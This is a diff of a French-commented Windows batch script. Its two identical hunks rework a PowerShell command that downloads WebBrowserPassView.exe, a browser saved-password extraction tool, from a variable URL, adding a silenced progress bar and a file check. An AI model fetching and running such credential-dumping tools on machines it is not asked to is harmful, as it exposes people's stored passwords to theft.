@@ -39,7 +39,7 @@ rem Telecharger si necessaire
 if not exist "%WBPV%" (
   echo.
   echo Telechargement de WebBrowserPassView.exe...
-  powershell -Command "try { Invoke-WebRequest -Uri '%DOWNLOAD_URL%' -OutFile '%WBPV%' -UseBasicParsing; Write-Host 'Telechargement termine!' -ForegroundColor Green } catch { Write-Host 'Erreur:' $_.Exception.Message -ForegroundColor Red; exit 1 }"
+  powershell -Command "$progressPreference='silentlyContinue'; Invoke-WebRequest -Uri '%DOWNLOAD_URL%' -OutFile '%WBPV%' -UseBasicParsing; if (!(Test-Path '%WBPV%')) { Write-Host 'Erreur: Telechargement echoue' -ForegroundColor Red; exit 1 } else { Write-Host 'Telechargement termine!' -ForegroundColor Green }"
   
   if %errorlevel% neq 0 (
     echo Erreur lors du telechargement.
@@ -96,7 +96,7 @@ rem Telecharger si necessaire
 if not exist "%WBPV%" (
   echo.
   echo Telechargement de WebBrowserPassView.exe...
-  powershell -Command "try { Invoke-WebRequest -Uri '%DOWNLOAD_URL%' -OutFile '%WBPV%' -UseBasicParsing; Write-Host 'Telechargement termine!' -ForegroundColor Green } catch { Write-Host 'Erreur:' $_.Exception.Message -ForegroundColor Red; exit 1 }"
+  powershell -Command "$progressPreference='silentlyContinue'; Invoke-WebRequest -Uri '%DOWNLOAD_URL%' -OutFile '%WBPV%' -UseBasicParsing; if (!(Test-Path '%WBPV%')) { Write-Host 'Erreur: Telechargement echoue' -ForegroundColor Red; exit 1 } else { Write-Host 'Telechargement termine!' -ForegroundColor Green }"
   
   if %errorlevel% neq 0 (
     echo Erreur lors du telechargement.
